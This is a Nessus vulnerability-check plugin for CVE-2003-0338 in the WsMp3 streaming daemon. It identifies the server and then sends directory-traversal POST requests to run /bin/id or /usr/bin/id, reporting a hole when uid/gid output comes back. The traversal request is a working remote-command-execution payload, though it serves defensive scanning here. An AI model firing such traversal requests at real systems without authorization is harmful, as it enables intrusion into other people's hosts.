#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(11645);
 script_version ("$Revision: 1.15 $");
 script_cve_id("CVE-2003-0338");
 script_osvdb_id(8440);

 script_name(english:"WsMp3 Daemon (WsMp3d) HTTP Traversal Arbitrary File Execution/Access");
 script_summary(english:"Attempts to execute /bin/id");

 script_set_attribute(attribute:"synopsis", value:
"The remote host is running a MP3 streaming web server with a
directory traversal vulnerability." );
 script_set_attribute(attribute:"description",  value:
"The remote host is using wsmp3d, an MP3 streaming web server.

There is a flaw in this server that allows anyone to execute arbitrary
commands and read arbitrary files with the privileges this server is
running with." );
 script_set_attribute(
   attribute:"see_also",
   value:"http://seclists.org/vulnwatch/2003/q2/79"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"There is no known solution at this time."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_attribute(attribute:"plugin_publication_date", value: "2003/05/21");
 script_set_attribute(attribute:"vuln_publication_date", value: "2003/05/21");
 script_cvs_date("$Date: 2016/11/15 19:41:09 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe",value:"cpe:/a:wsmp3:wsmp3_daemon");
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_family(english:"Web Servers");
 script_copyright(english:"This script is Copyright (C) 2003-2016 Tenable Network Security, Inc.");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 8000);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


ports = add_port_in_list(list:get_kb_list("Services/www"), port:8000);
foreach port (ports)
{
 if ( ! get_http_banner(port:port) ) continue;

 w = http_send_recv3(method:"GET", item:"/cmd_ver", port:port);
 if (isnull(w)) continue;
 res = strcat(w[0], w[1], '\r\n', w[2]);

 if ( "WsMp3" >< res ) 
 {
 dirs = get_kb_list(string("www/", port, "/content/directories"));
 if(!isnull(dirs))
 {
  dirs = make_list(dirs);
  dirs = list_uniq(make_list(dirs[0], cgi_dirs()));
 }
 else
  dirs = cgi_dirs();

foreach d (dirs)
{
 # version: 10 ?
 w = http_send_recv3(method:"POST", port: port,
   item: d+"/../../../../../../../../../../../../bin/id");
 if (isnull(w)) break;
 r = strcat(w[0], w[1], '\r\n', w[2]); 
 if("uid=" >< r  && egrep(pattern:"uid=[0-9].*gid=[0-9]", string:r) )
 {
  security_hole(port);
  exit(0);
 }
 if("id: Not implemented" >< r)
 {
  # version:10 ?
  w = http_send_recv3(method:"POST", port:port,
    item: d+"/../../../../../../../../../../../../usr/bin/id");
  if (isnull(w)) break;
  r = strcat(w[0], w[1], '\r\n', w[2]); 
  if("uid=" >< r && egrep(pattern:"uid=[0-9].*gid=[0-9]", string:r) )
  {
  security_hole(port);
  exit(0);
  }
  }
 }
}
}
